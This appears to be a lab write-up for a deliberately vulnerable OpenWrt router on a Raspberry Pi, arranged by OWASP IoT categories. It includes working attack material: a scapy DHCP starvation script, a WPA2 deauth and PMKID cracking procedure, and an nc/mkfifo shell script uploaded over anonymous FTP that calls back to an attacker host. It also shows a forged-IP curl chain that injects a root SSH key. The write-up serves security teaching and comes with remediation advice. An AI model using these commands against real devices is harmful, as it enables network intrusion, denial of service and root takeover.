> **DONE (RC-V1).** The monolithic `/etc/dnsmasq.conf` is parked (shipped as `dnsmasq.conf.reference`) because it crash-looped dnsmasq, so the insecure directives are folded into UCI by `60-dnsmasq.sh`. Verified live on a cold-boot reflash: dnsmasq starts clean and the generated config carries `cache-size=10000`, `dhcp-lease-max=100000`, `log-queries=extra`, `log-dhcp` and `dhcp-script`, with `rebind_protection=0` (DNS rebinding no longer filtered). Lease-file tampering was reproduced (a forged `/tmp/dhcp.leases` entry survived a `SIGHUP`). `dhcp-ignore=tag:!known` is deliberately NOT carried over (it would drop the wireless AP's DHCP clients), so DHCP starvation is now possible (the config allows it, the flood itself was not run). Point 3, the root-exec script, is scoped closed as jail-contained: it runs but `ujail` neutralizes its side effects on this build (see below), documented as such rather than made live.

The DHCP and DNS service configuration is insecure. With the directives folded into UCI (above), each attack below is scoped to what the live config now allows. Live reproduction on the Pi is pending (RC-V1 `05_verify`):

**Lease-file tampering (works, local).** The lease database is world-writable in `/tmp` (`dhcp-leasefile=/tmp/dhcp.leases`), so any local user can inject or rewrite leases and reload dnsmasq. This needs a shell on the device (chain it after an RCE path), not a network position:
```zsh
echo "0 00:11:22:33:44:55 192.168.2.50 fake-host 01:00:11:22:33:44:55" > /tmp/dhcp.leases
killall -HUP dnsmasq
```

**DHCP starvation (now possible).** The earlier build dropped unknown clients via `dhcp-ignore=tag:!known`, but that directive is deliberately not folded into UCI (it would break the wireless AP's DHCP clients), so dnsmasq now answers unknown MACs. A flood of random-MAC `DISCOVER` packets consumes the pool. Live confirmation pending:
```python
from scapy.all import *
import time

def dhcp_starvation():
    conf.checkIPaddr = False
    for i in range(1000):
        mac = RandMAC()
        dhcp_discover = Ether(src=mac, dst='ff:ff:ff:ff:ff:ff') / \
                       IP(src='0.0.0.0', dst='255.255.255.255') / \
                       UDP(sport=68, dport=67) / \
                       BOOTP(chaddr=mac) / \
                       DHCP(options=[('message-type','discover'), 'end'])
        sendp(dhcp_discover, iface='eth0', verbose=0)
        time.sleep(0.01)
dhcp_starvation()
```

**DNS: rebinding is enabled, off-path poisoning is unreliable.** `rebind_protection=0` is now set in UCI (`60-dnsmasq.sh`), so the resolver does not filter private-range answers: an attacker-controlled domain can resolve to an internal IP (DNS rebinding), reaching LAN-bound services from a victim's browser. The blind poisoning snippet below is illustrative only, dnsmasq randomizes the query source port and transaction ID, so a single forged response with a guessed `dport`/`id` will not reliably match an in-flight query:
```python
from scapy.all import *

def dns_poison():
    ip = IP(src='8.8.8.8', dst='192.168.2.1')
    udp = UDP(sport=53, dport=33333)
    dns = DNS(id=12345, qr=1, aa=1, qd=DNSQR(qname='google.com', qtype='A'),
               an=DNSRR(rrname='google.com', type='A', ttl=300, rdata='192.168.2.200'))
    send(ip/udp/dns, verbose=1)

dns_poison()
```
### 2.8 Wireless AP (weak WPA2-PSK)

> **DONE.** Attack chain verified end to end on a live Pi (Cypress CYW43455): the AP broadcasts `RoutCoon` on 2.4GHz channel 6 (WPA2), a laptop and a phone associate and get `192.168.3.x` leases, reach LuCI at `192.168.3.1`, and the WPA2 handshake was captured and cracked offline to `password123`. Two defects found and fixed during verification, both now in source: the hook forced `band 5g`/`VHT80` that the brcmfmac driver rejects in AP mode (`AP-DISABLED`), corrected to `band 2g`/`NOHT`, and dnsmasq crash-looped on a `cache-size` clash between the overlay's monolithic `/etc/dnsmasq.conf` and the UCI config, resolved by shipping that file as `dnsmasq.conf.reference` so dnsmasq boots from UCI. A cold-boot reflash reproduces the whole chain.

RoutCoon now behaves like a real router: it broadcasts its own Wi-Fi network from the Pi onboard radio instead of only living on the wired `eth0` LAN. The access point runs in `mode ap` with WPA2-PSK and is its own network, `192.168.3.0/24`, with the router as the gateway at `192.168.3.1` and its own DHCP pool. Because every service already binds `0.0.0.0`, a client that associates to the Wi-Fi reaches LuCI :80, Dropbear :22, FTP :21, SNMP :161, telnet :5515 and UPnP :5000 at `192.168.3.1`, so the whole service surface documented above becomes reachable over the air with no wired foothold.

The weakness is the pre-shared key. It is hardcoded into the lab image, identical on every deployment, never rotated, and present in common wordlists, so it is recovered offline from a single 4-way-handshake capture (CWE-798 / CWE-521). This is the wireless face of [[#IoT:I1 - Weak Guessable, or Hardcoded Passwords]].

The AP is provisioned by `88-routcoon-wifi-ap.sh`, where the intentional weakness sits as tunable knobs at the top of the file:
```sh
AP_SSID="RoutCoon"
AP_PSK="password123"          # hardcoded, in rockyou (CWE-798 / CWE-521)
...
uci set wireless.@wifi-iface[-1].mode='ap'
uci set wireless.@wifi-iface[-1].encryption='psk2'
uci set wireless.@wifi-iface[-1].key="$AP_PSK"
```

Over-the-air attack (run from a second station with a monitor-capable adapter):
```sh
# 1. find the network and note its BSSID and channel
nmcli dev wifi list | grep RoutCoon        # or with iwd: iwctl station <dev> get-networks

# 2. kill managed-mode services and drop the adapter into monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0                 # creates wlan0mon

# 3. locate the AP on the air, note its BSSID and channel
sudo airodump-ng wlan0mon                  # find RoutCoon, then Ctrl-C

# 4. lock to it and capture the WPA2 4-way handshake, deauth a client to force it
sudo airodump-ng -c 6 --bssid <AP_BSSID> -w routcoon wlan0mon
sudo aireplay-ng --deauth 5 -a <AP_BSSID> wlan0mon

# 5. crack the PSK offline
aircrack-ng -w /usr/share/wordlists/rockyou.txt routcoon-01.cap   # -> KEY FOUND! [ password123 ]

# 6. restore managed wifi, associate, and reach the services
sudo airmon-ng stop wlan0mon
nmcli dev wifi connect RoutCoon password 'password123'
curl -s http://192.168.3.1/                # LuCI, then chain any 2.x finding above
```

Listing WiFi networks with NetworkManager CLI:

![[iot2-nmcli-list-wifi-networks.png]]

You can also list available WiFi networks and their properties with `airodump-ng`:

![[iot2-list-wifi-networks-airodump.png]]

Capture the WPA2 4-way handshake forcing deauthentication attack:

![[iot2-deauth-mobile.png]]

Use `aircrack-ng` to crack WiFi network's password using the network capture:

![[iot2-wifi-password-cracked.png]]

Clientless alternative (PMKID). If no client is connected to force a handshake, capture the PMKID that the AP puts in its first RSN frame and crack it with hashcat mode 22000. No associated victim is required:
```sh
# capture PMKID in monitor mode (hcxdumptool flags vary by version, check yours)
sudo hcxdumptool -i wlan0mon -w routcoon.pcapng

# convert to the hashcat 22000 (WPA-PBKDF2-PMKID+EAPOL) format
hcxpcapngtool -o routcoon.22000 routcoon.pcapng

# crack the same weak PSK
hashcat -m 22000 routcoon.22000 /usr/share/wordlists/rockyou.txt
```
The recovered key is the same weak PSK (`password123`), so this is a second path to the same over-the-air foothold, useful when the AP has no clients to deauth.

Hardware note: the onboard radio exists on Pi 3B/3B+ (the `brcmfmac` nvram for 43430/43455 is in `.config`). On a real Pi 2 (the `bcm2709` build profile) a USB Wi-Fi adapter is required. If no radio is present the hook logs a `no wifi-device` warning to `/root/vulnzoo.log` and leaves the other services untouched. The hook forces 2.4GHz channel 6 with `htmode NOHT` (802.11g), because the brcmfmac FullMAC driver rejects the HT capabilities hostapd auto-generates in AP mode and would otherwise leave the interface disabled. The runtime interface is `phy0-ap0`.

# IoT:I3 - Insecure Ecosystem Interfaces

> **DONE.** Low-severity finding. Per OWASP the fuller scope of insecure ecosystem interfaces belongs to the mobile/backend interface rather than the device, so this device-side item is intentionally minimal.
## Definition
> Insecure web, backend API, cloud, or **mobile interfaces** in the ecosystem outside of the device that allows compromise of the device or its related components. Common issues include a lack of authentication/authorization, lacking or weak encryption, and a lack of input and output filtering.

Using wordlists for endpoints, we can find firsthand that there is a `/cgi-bin/luci/admin` subroutine. This is revealed by the fact that we get a `Forbidden 403` code compared to non-existent routes that report a `Not Found 404`.

![[iot3_fuzzing_admin_endpoint.png]]

However, due to the configuration of `dispatcher.lua`, starting from a valid subdirectory, the rest of the subdirectories do not report a `Not Found` error even if they do not exist.

```zsh
$ wfuzz -c -w wordlist.txt -u "http://192.168.2.1/cgi-bin/luci/admin/FUZZ"                                            
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.2.1/cgi-bin/luci/admin/FUZZ
Total requests: 4

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000003:   403        91 L     208 W      2897 Ch     "foobar"                                                                                                                     
000000002:   403        91 L     208 W      2896 Ch     "admin"                                                                                                                      
000000001:   403        91 L     208 W      2897 Ch     "system"                                                                                                                     
000000004:   403        91 L     208 W      2896 Ch     "tried"                                                                                                                      

Total time: 0.158685
Processed Requests: 4
Filtered Requests: 0
Requests/sec.: 25.20710
```

We cannot differentiate between which endpoints exist and which do not based on what the server reports. However, if we test the interface a little, we notice some strange behavior.

![[iot3_interface_exposes_endpoint.png]]

If we try to access a directory that is unlikely to exist, such as `/cgi-bin/luci/admin/foobar`, we see a message pop up saying that the resource does not exist. If we try fuzzing with incorrect login data, we can see that there are changes between different requests, which tells us which subroutes exist.

```zsh
$ wfuzz -c -w wordlist.txt -u "http://192.168.2.1/cgi-bin/luci/admin/FUZZ" -d "luci_username=root&luci_password=password"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.2.1/cgi-bin/luci/admin/FUZZ
Total requests: 4

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000001:   403        94 L     219 W      3005 Ch     "system"                                                                                                                     
000000003:   403        98 L     231 W      3109 Ch     "foobar"                                                                                                                     
000000002:   403        98 L     231 W      3108 Ch     "admin"                                                                                                                      
000000004:   403        98 L     231 W      3108 Ch     "tried"                                                                                                                      

Total time: 0
Processed Requests: 4
Filtered Requests: 0
Requests/sec.: 0


```

As you can see, subroutes that do not have the message take up less space, and despite the `Forbidden` code in all requests, it is now possible to discern which ones do exist.

```zsh
$ wfuzz -c -w wordlist.txt -u "http://192.168.2.1/cgi-bin/luci/admin/system/FUZZ" -d "luci_username=root&luci_password=password"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.2.1/cgi-bin/luci/admin/system/FUZZ
Total requests: 4

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000002:   403        94 L     219 W      3011 Ch     "admin"                                                                                                                      
000000003:   403        98 L     231 W      3116 Ch     "foobar"                                                                                                                     
000000001:   403        94 L     219 W      3012 Ch     "system"                                                                                                                     
000000004:   403        98 L     231 W      3115 Ch     "tried"                                                                                                                      

Total time: 0
Processed Requests: 4
Filtered Requests: 0
Requests/sec.: 0
```

We have obtained the endpoints `/cgi-bin/luci/admin/system/admin` and `/cgi-bin/luci/admin/system/system`.


# IoT:I4 - Lack of Secure Update Mechanism
## Definition
> Lack of ability to securely update the device. This includes lack of firmware validation on device, lack of secure delivery (un-encrypted in transit), lack of anti-rollback mechanisms, and lack of notifications of security changes due to updates.
## Description
OpenWrt uses a lightweight package manager called `opkg`. The system relies entirely on the paths defined in `/etc/opkg/distfeeds.conf`.

The security system is not as good as with *APT* because OpenWRT does not individually sign packages.
### 1. Repository replacement
One valid option could be to modify the contents of */etc/opkg/distfeeds.conf* so that it points to a local URL located on our attacking machine. This would allow a malicious *.ipk* file to be uploaded.

To carry out this type of attack, we need to gain access to the file somehow, and to do this we can perform a privilege escalation.
### 2. Misconfiguration of the opkg.conf file
The configuration of the opkg tool for installing packages resides in the */etc/opkg.conf* file. This file has an option that is insecure:
![[iot4_opkg_misconfiguration.png]]

The ‘0’ in the *check_signature* option indicates that the tool never checks whether the package being installed has a valid signature. This is also related to the risk [[#IoT:I9 - Insecure Default Settings]].

#### #### 1.2.  Escalating privileges with cron tasks

We can detect in the firmware that there is a file in */etc/crontabs* called *root* that executes a cron task. Inside, we find this:

```shell
*/3 * * * * /opt/oem-updates/scripts/auto-updater.sh
```

The device implements automatic firmware updates but lacks cryptographic verification of the update package. The update mechanism accepts unsigned images from arbitrary locations (FTP/HTTP), allowing attackers to flash malicious firmware that persists across reboots.

The connection to the directory via FTP does not reveal any clues that would allow the attacker to know where they are accessing, but this could be discovered through static analysis of the firmware. However, we do find text that appears to be related to the functionality of this service.

```zsh
$ ftp 192.168.2.1
Connected to 192.168.2.1.
220 Operation successful
Name (192.168.2.1:user): anonymous
230 Operation successful
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> get README.txt
local: README.txt remote: README.txt
229 EPSV ok (|||39489|)
150 Opening BINARY connection for README.txt (684 bytes)
100% |*********************************************************|   684       10.19 MiB/s    00:00 ETA
226 Operation successful
684 bytes received in 00:00 (3.21 MiB/s)
ftp> exit
221 Operation successful

$ cat README.txt 
========================================
OEM FIRMWARE UPDATE SERVER - STAGING
========================================
Location: /opt/oem-updates/pending/
User: anonymous (write-enabled)

SUPPORTED FILE TYPES:
  *.img    - Standard OpenWRT firmware images (sysupgrade)
  *.sh     - Pre-installation hooks/preparation scripts

INSTRUCTIONS:
1. Upload firmware files (*.img) to this directory
2. System auto-processes every 3 minutes via root cron
3. Files are automatically executed/installed and deleted

WARNING: Ensure compatibility with RoutCoon hardware.
Invalid files may cause system instability.

For support: contact@routcoon-oem.local
========================================   
```

We now know that this directory contains the scripts and binary files that execute the update on the vulnerable router. This document tells us that pre-installation scripts are run to prepare for the update, so we can try to see if the mechanism responsible for executing these scripts validates them or if, on the contrary, we can execute commands remotely.

In this case, commands can be executed remotely, so we can obtain a forward shell by using netcat and mkfifo with the following script.  We open a connection this way since OpenWRT uses BusyBox, so it does not have /dev/tcp implemented.

```sh
#!/bin/ash
rm /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.2.2 9001 > /tmp/f
```

We use FTP to upload the script to the */opt/oem-updates/pending* folder (the anonymous FTP home) and wait for the cron job to run it.

```shell
$ ftp 192.168.2.1
Connected to 192.168.2.1.
220 Operation successful
Name (192.168.2.1:user): anonymous
230 Operation successful
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> put script.sh 
local: script.sh remote: script.sh
229 EPSV ok (|||43203|)
150 Ok to send data
100% |*********************************************************|    95      779.60 KiB/s    00:00 ETA
226 Operation successful
95 bytes sent in 00:00 (130.85 KiB/s)
ftp> exit
221 Operation successful

$ nc -lvnp 9001
Listening on 0.0.0.0 9001
Connection received on 192.168.2.1 54916


/bin/sh: can't access tty; job control turned off
BusyBox v1.36.1 (2025-09-19 21:19:38 UTC) built-in shell (ash)

~ # id
uid=0(root) gid=0(root) groups=0(root)
~ # whoami
root
~ # ls
vulnzoo.log
~ # 
```
# IoT:I5: Using Insecure or Outdated Components
## Definition

> Use of deprecated or insecure software components/libraries that could allow the device to be compromised. This includes insecure customization of operating system platforms, and the use of third-party software or hardware components from a compromised supply chain.

**ID:** `IoT5-001`  
**Severity:** High  
**Affected Component:** SSH Service (Dropbear)  
**Firmware Version:** OpenWrt 24.10.3 (Custom/VulnZoo)

---

> **DONE (RC-V2).** The `support/remote` unauthenticated SSH-key injection was verified live on the flashed Pi: a forged support IP writes an attacker key to root's `authorized_keys` and yields a passwordless root SSH login. This section overlaps with [[#IoT:I3 - Insecure Ecosystem Interfaces]]: the endpoint-discovery material below is shared with IoT3.

The endpoint-discovery technique used to reach the admin surface (LuCI returns `403 Forbidden` for existing admin subroutes and `404 Not Found` for non-existent ones, and the `dispatcher.lua` behaviour that makes deeper paths differ by response size rather than status) is the same one documented under [[#IoT:I3 - Insecure Ecosystem Interfaces]]. Rather than repeat that walkthrough, this section covers what the enumeration leads to on the IoT5 surface: leftover development interfaces, one of which injects an SSH key.

---

![[iot5_no-ssh-keys.png]]

Initially, we find that we cannot access the router directly as root due to a device policy issue. We have more information on why this is the case in [[#IoT:I9 - Insecure Default Settings|IoT9]].

![[iot5_ssh_root_failed.png]]

Fuzzing the interface surfaces development leftovers. Two of the unauthenticated nodes registered by `network_tools.lua` are reachable without a session, `/cgi-bin/luci/api` and `/cgi-bin/luci/tools` (the SSRF and diagnostic tools documented under API7/API8 in `API/Vulnerabilities.md`).

![[iot5_x_debug_mode.png]]

![[iot5_interface_fuzzing.png]]

The high-value leftover is the "Remote Connectivity Check" at `/cgi-bin/luci/support/remote/diagnostic` (`controller/support/remote.lua`, registered with `sysauth = false`, so it needs no login). It answers `?debug=1` with a full environment dump, and it decides "authorized support" from a forwarded-IP value read out of spoofable request parameters (`X-Forwarded-For`, `real_ip`, `xff`, `remote_addr`) matched against the `203.0.113.0/24` support network. Spoofing that IP flips the endpoint into its authorized mode, which exposes an `update_ssh_access` action that appends an attacker-supplied key to `/etc/dropbear/authorized_keys`. Because dropbear only disables root *password* login (`RootPasswordAuth off`), an injected key can still grant SSH access. The full unauthenticated-to-SSH forge-and-inject walkthrough is documented as its own `support/remote` finding.

![[iot5-params-filtered.png]]

![[iot5_debug_ssh.png]]

![[iot5_ssh_key_injection.png]]

## Unauthenticated SSH key injection via the support endpoint

This is the highest-impact leftover on the device: an unauthenticated endpoint that writes to root's `authorized_keys`. It is registered in `controller/support/remote.lua` outside the authenticated `admin/*` tree:

```lua
local page = entry({"support", "remote", "diagnostic"}, call("remote_diagnostic_tool"), _("Remote Connectivity Check"), 1)
page.sysauth = false
```

so `http://192.168.2.1/cgi-bin/luci/support/remote/diagnostic` needs no login.

### Root cause: authorization by a spoofable client IP

The endpoint decides "authorized support" from a forwarded-IP value, and `get_forwarded_ip()` falls through from real request headers to attacker-controlled form parameters:

```lua
xff = http.formvalue("X-Forwarded-For")   -- VULNERABLE
xff = http.formvalue("real_ip")           -- VULNERABLE
xff = http.formvalue("xff")               -- VULNERABLE
xff = http.formvalue("remote_addr")       -- VULNERABLE
```

`is_support_ip()` then authorizes anything matching `203.0.113.0/24` (TEST-NET-3, the "support network"):

```lua
if first_ip:match("^203%.0%.113%.%d+$") then return true end
```

Because the IP is read from a POST parameter, an attacker just supplies `real_ip=203.0.113.100`. The unauthorized page even leaks the expected value in an HTML comment (`Support server: 203.0.113.100`) and advertises the `?debug=1` environment dump.

### Recon

```shell
# generic page: read the HTML-comment hints
curl -s "http://192.168.2.1/cgi-bin/luci/support/remote/diagnostic" | grep -i "support\|debug"
# environment dump (which parameters are honored)
curl -s "http://192.168.2.1/cgi-bin/luci/support/remote/diagnostic?debug=1"
```

![[iot5-support-server-leak.png]]
### Discovery: the endpoint self-discloses the privileged action

The attacker never has to guess the `action=update_ssh_access` parameter, the endpoint hands it over. Discovery is a two-stage self-disclosure, and the only gated secret is the support IP itself.

First, `?debug=1` does more than dump the environment. `dump_environment()` prints the exact spoofable parameter names, so the attacker learns precisely which value to forge:

```lua
debug_info = debug_info .. "real_ip (param) = " .. (http.formvalue("real_ip") or "nil") .. "\n"
debug_info = debug_info .. "xff (param) = " .. (http.formvalue("xff") or "nil") .. "\n"
debug_info = debug_info .. "remote_addr (param) = " .. (http.formvalue("remote_addr") or "nil") .. "\n"
```

Second, once a forged `real_ip=203.0.113.100` passes `is_support_ip()`, `remote_diagnostic_tool()` stops serving the generic page and returns the "Support Access Panel", whose HTML literally contains the exploit form:

```html
<form method="POST">
    <input type="hidden" name="action" value="update_ssh_access">
    <textarea name="key_data" placeholder="ssh-ed25519 AAAA... user@host"></textarea>
    <input type="submit" value="Add SSH Key">
</form>
```

![[iot5-server-is_support-leak.png]]

So the chain is: read the support IP from the HTML comment on the unauthorized page, forge it to get authorized, and the authorized response then documents the privileged action for you. The `curl` in the next section is just a replay of that form. Guessing an action name is never required, because the one secret that gates everything (`203.0.113.100`) is printed in plain sight.
### Exploit: forge the support IP, inject a key

When "authorized", the `update_ssh_access` action appends the supplied key to `/etc/dropbear/authorized_keys`:

```lua
if action == "update_ssh_access" and key_data then
    local result = add_ssh_key(key_data, real_ip or remote_addr)
-- ...
local auth_file = "/etc/dropbear/authorized_keys"
```

```shell
ssh-keygen -t ed25519 -f rc_key -N ''
curl -s "http://192.168.2.1/cgi-bin/luci/support/remote/diagnostic" \
  --data-urlencode "real_ip=203.0.113.100" \
  --data-urlencode "action=update_ssh_access" \
  --data-urlencode "key_data=$(cat rc_key.pub)"
# -> "SSH access updated successfully. Key fingerprint: ..."
ssh -i rc_key root@192.168.2.1
```

### Expected result and impact

The endpoint returns `SSH access updated successfully` and the key lands in `/etc/dropbear/authorized_keys`, which on OpenWRT is root's key file. Dropbear's `RootPasswordAuth off` (see [[#IoT:I9 - Insecure Default Settings|IoT9]]) disables only root *password* login, not pubkey login, so the injected key grants a root SSH session and bypasses the "crack `openwrtuser`, then escalate" path entirely. This is an unauthenticated-to-root chain: no credentials, no session, one POST.

Verified live on the flashed Pi (RC-V2): a forged `real_ip=203.0.113.100` POST wrote the attacker key to `/etc/dropbear/authorized_keys`, and `ssh -i rc_key root@192.168.2.1` returned a root shell with no password prompt. `RootPasswordAuth off` blocks only the password path, so the injected pubkey grants root directly, exactly as the chain predicts.

![[iot5-remote-shell-obtained.png]]

**OWASP / CWE:** API5:2023 Broken Function-Level Authorization; CWE-290 Authentication Bypass by Spoofing; CWE-306 Missing Authentication for a Critical Function.

### Remediation

Authorize from the real transport source (`REMOTE_ADDR`), never from a client-supplied header or parameter; require an authenticated session to provision keys; and strip the endpoint from production images.


# IoT:I6 - Insufficient privacy protection
## Definition
> User's personal information stored on the device or in the ecosystem that is used insecurely improperly, or without permission.
> **DONE.** Realized as network-metadata privacy (device identity and browsing behavior); no new code.

A router holds little classic PII, but it does collect two privacy-sensitive categories about the people behind it: who is on the network (device identity and presence) and what they browse (DNS history). RoutCoon exposes both with no protection.

### Who is on the network (device inventory)

The SNMP `public` community (unauthenticated, see 2.5) exposes the ARP table, which lists every connected device by IP and MAC:

```shell
snmpwalk -v 2c -c public 192.168.2.1 1.3.6.1.2.1.4.22   # ARP: IP -> MAC of every client
```

The DHCP lease file (`/tmp/dhcp.leases`, world-readable) plus `read-ethers` add the client hostnames, so an attacker learns not just addresses but device names ("johns-laptop", "kitchen-cam"), mapping the household or office and who is present.

### What they browse (DNS history)

dnsmasq logs every DNS query (`log-queries`, folded into UCI in RC-V1) to the system log, read with `logread`, so it is a per-client browsing history: which sites each device resolved and when. Verified live, `logread | grep dnsmasq` shows the `query[...] ... from <client>` lines. The monolithic `dnsmasq.conf` used to redirect these to `/var/log/dnsmasq.log` via `log-facility`, but that file is parked (see 2.7), so on this build the history lands in syslog. Anyone who can read the log, or capture the cleartext DNS traffic (see [[#IoT:I7 - Insecure Data Transfer and Storage|IoT7]]), reconstructs the browsing behavior of every user on the network.

### Impact and remediation

Combined, an unauthenticated LAN attacker profiles who is on the network, what devices they use, and what they browse, with no consent or protection. Remediation: restrict SNMP to authenticated v3 or localhost, stop logging DNS queries (or protect and rotate the log), and move DHCP state off world-readable `/tmp`.

**Scope note.** This is network-metadata privacy (identity, presence, browsing behavior), the privacy exposure a router realistically has. There is no stored end-user PII (documents, accounts) on the device, so I6 is intentionally scoped to that metadata rather than inventing a data store the device does not have.

**OWASP / CWE.** IoT6; CWE-359 Exposure of Private Personal Information; CWE-200 Exposure of Sensitive Information.
# IoT:I7 - Insecure Data Transfer and Storage
## Definition
> Lack of encryption or access control of sensitive data anywhere within the ecosystem, including at rest, in transit, or during processing.
> **DONE (RC-V2 / RC-V6).** In transit is self-evident: uhttpd serves plain HTTP on `:80` with no TLS, so every LuCI login used throughout this lab crosses the wire in cleartext, and FTP/SNMP/telnet are plaintext too. At rest is verified live: the `/tmp` DHCP leasefile is world-writable (lease tampering reproduced in RC-V1) and the DNS query history lands in syslog, read with `logread` (path corrected in RC-V6 from the parked `/var/log/dnsmasq.log`). No new code.

The router moves and stores sensitive data with no encryption and no access control. Two reproducible angles: cleartext transmission (CWE-319) and world-readable/writable storage (CWE-312 / CWE-732).

### In transit: cleartext admin and services (CWE-319)

uhttpd is configured for plain HTTP only (`30-uhttpd-config.sh` sets `listen_http` on `:80`, no `listen_https` and no TLS certificate), so the admin login crosses the wire in cleartext. A passive sniffer on the LAN recovers the credentials and the session cookie:

```shell
tcpdump -i eth0 -A -s0 'tcp port 80' | grep -A2 luci_username
# ... luci_username=root&luci_password=uncrackable
# Set-Cookie: sysauth=<session>
```

![[iot7-cleartext-capture.png]]

The same holds for every other service the lab exposes: FTP (`:21`), SNMP v1/v2c (`:161`, community string and data), and the hidden Telnet root shell (`:5515`) are all plaintext. The `support/remote` SSH-key POST (see IoT5) also travels in cleartext, so the injected key and the spoofed support IP are sniffable.

### At rest: world-modifiable state and plaintext logs (CWE-312 / CWE-732)

dnsmasq keeps its live DHCP database in `/tmp`, world-modifiable by design:

```
dhcp-leasefile=/tmp/dhcp.leases
dhcp-hostsfile=/tmp/hosts
```

Any local process can rewrite the lease table or the hosts file with no privileges (the lease-injection and hosts-poisoning repros are in the DHCP/DNS section). DNS queries are logged in cleartext to the system log (`log-queries`, read with `logread`), exposing the browsing history of every client to anyone with log access.

Several components also write sensitive data to predictable, low-privilege paths:

| Path | Written by | Contents |
|------|-----------|----------|
| `/tmp/support_env_debug.log` | `support/remote.lua` | full request environment, including spoofed support IPs |
| `/var/log/support_access.log` | `support/remote.lua` | every access, the forwarded IP, and injected-key prefixes |
| `/etc/dropbear/authorized_keys` | `support/remote.lua` | attacker-injected root keys (see IoT5) |
| `/root/vulnzoo.log` | provisioning hooks | account-creation trace |

### Impact and remediation

Any unprivileged LAN position recovers admin credentials, session cookies and DNS history by sniffing, and any local account can read the debug/access logs or rewrite the DHCP state. Remediation: serve LuCI over HTTPS (redirect `:80` -> `:443`) and drop the plaintext services, move DHCP state off `/tmp` to a root-only path, and stop writing request environments and key material to world-readable logs.

**OWASP / CWE.** IoT7; CWE-319 Cleartext Transmission of Sensitive Information; CWE-312 Cleartext Storage of Sensitive Information; CWE-732 Incorrect Permission Assignment for Critical Resource.
# IoT:I8 - Lack of device management
## Definition
> Lack of security support on devices deployed in production, including asset management, update management, secure decommissioning, systems monitoring, and response capabilities.
> **DONE.** Management-layer synthesis of gaps demonstrated by the concrete findings cross-linked below (no new code).

Device management is the lifecycle around a deployed device: updating it safely, watching it, responding to abuse, and decommissioning it. RoutCoon has none of these controls. Each gap below is demonstrated by a concrete finding elsewhere in this doc.

### Update management

The device cannot be updated securely. `opkg` runs with `check_signature 0`, and the `auto-updater.sh` cron executes unsigned scripts dropped over anonymous FTP, with no signature check, no anti-rollback, and no operator notification (see [[#IoT:I4 - Lack of Secure Update Mechanism|IoT4]]). An operator has no trustworthy inventory of what firmware or packages are actually installed.

### No monitoring or response (CWE-778)

There is no security monitoring, alerting, or response capability. The logs that do exist are unmanaged: DNS query logs and the DHCP state sit world-readable/writable in `/tmp`, and the `support/remote` access log records attacks in cleartext but nothing acts on them (see [[#IoT:I7 - Insecure Data Transfer and Storage|IoT7]]). Log tampering is trivial (the `/tmp` files), so even forensic value is limited.

### No brute-force protection (CWE-307)

No auth surface rate-limits or locks out. SSH accepts unlimited `hydra` runs against `openwrtuser` (see IoT2), the LuCI session setup has no throttling (see the API doc, API2), and the unauthenticated `api/*` and `tools/*` endpoints can be hammered freely. There is no detection or lockout on any of them.

### No key or credential lifecycle / decommissioning

Injected SSH keys persist in `/etc/dropbear/authorized_keys` with no rotation or review (see IoT5), hardcoded credentials never change, and there is no secure-wipe or decommissioning path, so a compromised device stays compromised.

### Impact and remediation

The device offers no way to detect, contain, or recover from compromise, and no way to trust its software supply chain. Remediation: signed updates with anti-rollback, centralized tamper-resistant logging with alerting, rate limiting and lockout on every auth surface, and a key/credential rotation plus secure-decommission process.

**OWASP / CWE.** IoT8; CWE-778 Insufficient Logging; CWE-307 Improper Restriction of Excessive Authentication Attempts. The insecure update path is CWE-347 / CWE-494 (see IoT4).
# IoT:I9 - Insecure Default Settings
## Definition
> Devices or systems shipped with insecure default settings or lack the ability to make the system more secure by restricting operators from modifying configurations.
### Restricted shell bypass

The `openwrtuser` account is a non-privileged user on the router. The system includes multiple user accounts, but the most relevant are `openwrtuser`, `root`, and `anonymous`. The `anonymous` user is used for anonymous logins to the **FTP** service. In contrast, `openwrtuser` has highly restricted permissions, with the ability to list certain parts of the system and a restricted shell that limits the available commands. This user was created to serve as a bridge account.

For security reasons, direct SSH access to an embedded device as the administrator or `root` user should be avoided. Disabling SSH access for `root` is not a common practice in IoT devices, but it should be adopted to enhance security.

Many IoT product developers do not implement this practice for several reasons:

1. **Simplicity:** Managing a single user is easier.
2. **Storage constraints:** Adding sudo/su increases memory usage.
3. **Technical support:** It is simpler to instruct users to "log in as root."
4. **Legacy compatibility:** Many legacy scripts assume the use of the `root` account.
5. **Cost:** The primary focus is product functionality; security hardening is often considered an unnecessary expense, leading to common security weaknesses.

In enterprise devices, where security is critical due to the potential for revenue loss and reputational damage, more robust security mechanisms are implemented. For example, Cisco network devices employ a hierarchical two-level command execution model that is considered an industry standard:

1. **User EXEC Mode (Non-privileged):** Allows access only to basic diagnostic and viewing commands.
2. **Privileged EXEC Mode (Privileged):** Grants full access to all commands.

These modes are not mutually exclusive; administrators must first access user mode and then authenticate to escalate to privileged mode.

A similar approach has been implemented in this laboratory. SSH access as the `root` user has been disabled on the device.

```zsh
config dropbear
        option Interface 'lan'
        option PasswordAuth 'on'
        option RootPasswordAuth 'off'
        option Port '22'
        # option BannerFile '/etc/banner'
        option MaxAuthTries '3'
        option RecvWindowSize '1048576'
        option SendWindowSize '1048576'

        # Security settings for management
        # option IdleTimeout '300'
